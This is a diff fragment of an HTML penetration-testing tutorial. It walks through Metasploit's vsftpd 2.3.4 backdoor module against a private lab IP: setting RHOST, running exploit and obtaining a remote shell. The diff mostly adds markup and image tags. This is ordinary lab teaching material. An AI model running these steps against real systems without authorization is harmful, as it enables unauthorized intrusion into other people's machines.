@@ -72,14 +72,15 @@ root-user-#/ $ nmap -sV -O 192.168.10.5</ul></p>
 <strong>msf6~/</strong> use exploit/unix/ftp/vsftpd_234_backdoor
 <ul>•	after selecting the above exploit let’s set up the target to which we are deploying the exploit.</ul>
 <strong>msf6~/</strong> (unix/ftp/vsftpd_234_backdoor): show options
+<img src="MV12.jpg">
  
  
 •	now we can see that we have the option to set RHOST which is the receiver host. so we will set it to the IP address of the target machine.
-msf6~/ (unix/ftp/vsftpd_234_backdoor): set RHOST 192.168.10.5
-Step 6: The final step is to run the exploit, by command exploit.
-msf6~/ (unix/ftp/vsftpd_234_backdoor): exploit
+<strong>msf6~/ (unix/ftp/vsftpd_234_backdoor)</strong>: set RHOST 192.168.10.5
+<p><strong>Step 6:</strong></p> The final step is to run the exploit, by command exploit.
+<strong>msf6~/ (unix/ftp/vsftpd_234_backdoor)</strong>: exploit
 •	after setting RHOST just enter the exploit command and you will see the command shell of the target machine is obtained.
- 
+ <img src="
  
 •	now we have successfully penetrated the target by obtaining a shell, you can try commands and verify in both machines at the same time. 
 Step 7: Verify by using some command shell commands like print the working directory or ls items in a folder.
